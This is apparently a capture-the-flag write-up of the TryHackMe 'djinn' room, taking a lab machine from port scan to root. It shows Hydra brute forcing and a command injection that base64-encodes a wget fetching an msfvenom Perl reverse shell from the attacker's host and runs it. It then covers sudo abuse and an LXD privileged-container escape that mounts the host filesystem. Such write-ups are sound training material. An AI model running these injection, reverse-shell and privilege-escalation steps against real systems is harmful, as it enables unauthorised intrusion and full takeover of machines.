# djinn Room

### Introduction

Room hosted at https://tryhackme.com/

I saw there are no write-ups for this one any maybe some of you need it. I will try to include my failed tries as well somehow in the story. It's usually not as straightforward as in the writeup. I also spend some time creating the custom script which you will see.

### Enumeration 

```
hack3rman@kali:~$ nmap -sT -sV 10.10.146.45 -p-
21/tcp   open  ftp     vsftpd 3.0.3
1337/tcp open  waste?
7331/tcp open  http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
```

So we have FTP, an unknown service and what seems to be a web site server.

### Recon

Lets take each service in order.

##### FTP (21)

```
hack3rman@kali:~/TryHackMe/djin$ ftp 10.10.146.45
Connected to 10.10.146.45.
220 (vsFTPd 3.0.3)
Name (10.10.146.45:hack3rman): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              11 Oct 20  2019 creds.txt
-rw-r--r--    1 0        0             128 Oct 21  2019 game.txt
-rw-r--r--    1 0        0             113 Oct 21  2019 message.txt
```
The files gives us some credentials, a possible username and some infrmation about the 1337 port.

I created a mix of the usernames and passwords based on combinations from the files and tried hydra to check them out on FTP. No match. Ok, let's move on.

##### Game (1337)

```
hack3rman@kali:~/TryHackMe/djin$ nc  10.10.146.45 1337
  ____                        _____ _                
 / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
| |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
| |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
 \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
                                                     

Let's see how good you are with simple maths
Answer my questions 1000 times and I'll give you your gift.
(8, '-', 6)
> 2
(6, '-', 9)
> -3
(6, '*', 9)
> x
Stop acting like a hacker for a damn minute!!

```
Playing around with the game we find that we need to supply the correct answer to the supplied arithmetic operation 1000 times to get something in return. Time for some python scripting.

... some hours later...
https://github.com/hack3rman/TryHackMe/blob/master/calc.py

I strongly encourage you to write your own script. You might try python3 for example. I tried but had some issues with the socket methods which expected binary data. I attached my script to be user for roadmap for example.

Now, we run the script and 1000 operations later:
```
Operation number 1000
Here is your gift, I hope you know what to do with it:

1356, 6784, 3409
```

What could this be? They might be some ASCII characters encoded in hex or decimal? Let's try it out. 
https://www.rapidtables.com/convert/number/ascii-hex-bin-dec-converter.html
After playing with the numbers a bit on the converter it seems not all can be decoded. Maybe something else?

They do look like port numbers. And I did another room on THB where I did learn about port knocking: https://tryhackme.com/room/lordoftheroot

I tried it with nmap. Connect scan and no port randomization (-r)
```
hack3rman@kali:~/TryHackMe/djin$ nmap -sT 10.10.146.45 -p1356,6784,3409 -r
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 07:29 EDT
Nmap scan report for 10.10.146.45
Host is up (0.061s latency).

PORT     STATE  SERVICE
1356/tcp closed cuillamartin
3409/tcp closed networklens
6784/tcp closed bfd-lag

Nmap done: 1 IP address (1 host up) scanned in 0.22 seconds

hack3rman@kali:~/TryHackMe/djin$ nmap -sT 10.10.146.45 -p-
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-09 07:29 EDT
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Nmap scan report for 10.10.146.45
Host is up (0.10s latency).
Not shown: 65531 closed ports
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
1337/tcp open  waste
7331/tcp open  swx
```
Look! Port 22 is opened now. Cool. We can try those credentials again.

```
hack3rman@kali:~/TryHackMe/djin$ hydra ssh://10.10.146.45 -Lusers -Ppass
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-05-09 07:32:16
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 84 login tries (l:7/p:12), ~6 tries per task
[DATA] attacking ssh://10.10.146.45:22/
1 of 1 target completed, 0 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-05-09 07:32:30
```
Oh no. This doesn't work either. Let's continue to the web service then. But we gathered some info which might be of use later.

##### Web (7331)

First I look at the home page. Nothing really there. Check the source out. (always check the source :D) I have access to one of the CSS files but nothing intresting. I tried to walk in the upper dirs. Still nonthing. Try harder!

It seems `dirb` which I usually scan http(s) websites with does not support custom ports (or I haven't figured it out yet). So for now I am using OWASP ZAP with the worldlists from dirb.
The common worldlist doesn't hit anything. Let's try the big one.

Oh nice! I found 2 pages `wish` and `genie`.

Visiting `wish` looks like you can send commands over. Let's try `ls` command. Ok we are redirected to the genie webpage but with the message "The area is forbidden". Maybe we can authenticate with the credentials somehow. Lets see the source. Wait. There is some extra data there.
```
app.py
app.pyc
static
templates
```
The same data is in the redirect link. So our comand works? Let's `echo "dang. I am one step closer"`. Hmm. We get "Wrong choice of words" back. `echo 1`. Works. Let's remove the `"`. Still wrong. Let's remove `.`. Works. Apparenly I cannot use `.` in the data I send. Now my next step would be to send a curl command to download a reverse connection script and launch it. But I can't use `.`. We somehow need to avoid dots.

NOTE! At this point with all the data changes and the fact the wish page was redirecting I switched to use OWASP where I could modify the data in the **Manual Request Editor** and see the response directly. 

### Exploiting ?

Now let's try command substitution. ``cmd=echo `echo 1` ``. This works. Next step is to try base64 encoding of my `wget` command.

```
hack3rman@kali:~/TryHackMe/djin$ msfvenom -p cmd/unix/reverse_perl LHOST=10.7.0.255 LPORT=4444 -o perl.pl
[-] No platform was selected, choosing Msf::Module::Platform::Unix from the payload
[-] No arch selected, selecting arch: cmd from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 229 bytes
Saved as: perl.pl

hack3rman@kali:~/TryHackMe/djin$ echo -n wget 10.7.0.255:8000/perl.pl | base64
d2dldCAxMC43LjAuMjU1OjgwMDAvcGVybC5wbA==

hack3rman@kali:~/TryHackMe/djin$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```
We have the file ready and the encoded comand. We will send it to the web server. `` cmd=`echo d2dldCAxMC43LjAuMjU1OjgwMDAvcGVybC5wbA== | base64 -d` ``. Let's list files again `cmd=ls`. Nice!
```
app.py
app.pyc
perl.pl
static
templates
```

Now we just run the file `cmd=bash perl.pl`. I realized that I could have ommited the dot in the file name for launching directly. Instead we need to encode this command as well as it contains the dot :(.
```
hack3rman@kali:~/TryHackMe/djin$ echo -e  bash perl.pl | base64
YmFzaCBwZXJsLnBsCg==
```
Sending this data to the server in the `wish` page `` cmd=`echo YmFzaCBwZXJsLnBsCg== | base64 -d` ``

Don't forget to fire a listener on the local machine! :)

Now I try to upgrade the shell to a fully working one with `socat`. I think I could have done this from the beginning (instead of perl) but this is how it went today...

```
www-data@djinn:/opt/80$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Good. We are in. In no particular order I usually check these first
1. suid binaries
2. programs running as root
3. /home and /root dirs
4. sudo commands

```
www-data@djinn:/opt/80$ find /home
/home
/home/nitish
/home/nitish/.cache
find: ‘/home/nitish/.cache’: Permission denied
/home/nitish/user.txt
/home/nitish/.gnupg
find: ‘/home/nitish/.gnupg’: Permission denied
/home/nitish/.bashrc
/home/nitish/.dev
/home/nitish/.dev/creds.txt
/home/nitish/.bash_history
/home/sam
```

Usually I am not this lucky but it seems we can read `/home/nitish/.dev/creds.txt`. Intresting. Since we already opened the `ssh` port we might as well try to connect.
```
nitish@djinn:~$ ls -l /home/nitish/user.txt 
-rw-r----- 1 nitish nitish 33 Nov 12 17:29 /home/nitish/user.txt
```
And we get the user flag. :D Cool!

### Privesc
Let's continue our jurney. Checking the sudo commands for the user we find one
```
User nitish may run the following commands on djinn:
    (sam) NOPASSWD: /usr/bin/genie

nitish@djinn:~$ sudo -u sam  /usr/bin/genie -h
usage: genie [-h] [-g] [-p SHELL] [-e EXEC] wish

I know you've came to me bearing wishes in mind. So go ahead make your wishes.

positional arguments:
  wish                  Enter your wish

optional arguments:
  -h, --help            show this help message and exit
  -g, --god             pass the wish to god
  -p SHELL, --shell SHELL
                        Gives you shell
  -e EXEC, --exec EXEC  execute command
```

Ok. Now the carousel starts. I tried looking at it with strings. Tried various input to it. I was thinking of debugging it but on my local machine I was missing a library. I tried inputing credentials to it. Nothing worked. At some point looking for the Nth time at the output of strings I again saw genie.py/genie.c. I already searched for these before in hope I could fine the source code. Let's just search for `genie`.
```
nitish@djinn:~$ find / -name "*genie*" 2>/dev/null
/usr/bin/genie
/usr/share/man/man8/genie.8.gz
/usr/share/man/man8/genie.1.gz
/usr/share/mime/text/x-genie.xml
/opt/80/templates/genie.html
```
Hey! We have ourselves a man page for the command. The help flag forgot an argument :). Trying left and right with the new argument we finally get a shell as `sam`. It's a "dumb" shell so I upgrade it to a full shell with `socat`.

What do we have here?

```
User sam may run the following commands on djinn:
    (root) NOPASSWD: /root/lago
```
All right. Looks like our next point of entry. Just needs some brainwork on this as well and we are root! 

Now I tried various combinations here as well. I tried writing a script in python which read the output of the command and inputted a random number trying to bruteforce it. I managed to only get some data from the command when I thought "Let me do this in bash. Maybe it's easier". 

I tried creating a nice for loop in bash and ended up just sending a value to the program. From time to time I did not receive the *Wrong* message back but nothing else either. Let's try other things.

Digging and diggin, somehow I realised that I was membemr of a lot of groups.

```
sam@djinn:/tmp/20200509_13:00$ id
uid=1000(sam) gid=1000(sam) groups=1000(sam),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare)
```

Instresting. Let's find out what files I have access to as this group.
Out of all one stands out: `/var/lib/lxd/unix.socket`. My initial thought was that I was somehow connected as container to the host and will be able to break out.

After some digging around the internet and reading about LXC (of which I know very few about) I found these 2 good resources: https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation & https://www.hackingarticles.in/lxd-privilege-escalation/.

From the latter I ran `lxd init` defaulting everthing besides the storage backend to `dir`. 

Next step was to download an Alpine Linux container image from. https://us.images.linuxcontainers.org/images/alpine/3.11/amd64/default/

I now proceeded with 
```
sam@djinn:/tmp/20200509_13:00$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
Image imported with fingerprint: d389eb93bf6d27a9f0940b2c903097c208a0834044a9b98218364c207e3059fc

sam@djinn:/tmp/20200509_13:00$ lxc init alpine privesc -c security.privileged=true
Creating privesc

sam@djinn:/tmp/20200509_13:00$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
Device host-root added to privesc

sam@djinn:/tmp/20200509_13:00$ lxc start privesc
sam@djinn:/tmp/20200509_13:00$ lxc exec privesc /bin/sh
~ # ls
~ # id
uid=0(root) gid=0(root)
~ # ls /mnt/root/root/
lago      proof.sh
```

###Conclusion
Wow. That was quite a ride. Spawning 2 days it combined both CTF and real world issues I guess. In the end the creds.txt and the root program were just rabbit hole. I really liked this room (even more I could beat it myself). Get it touch for feedback :)
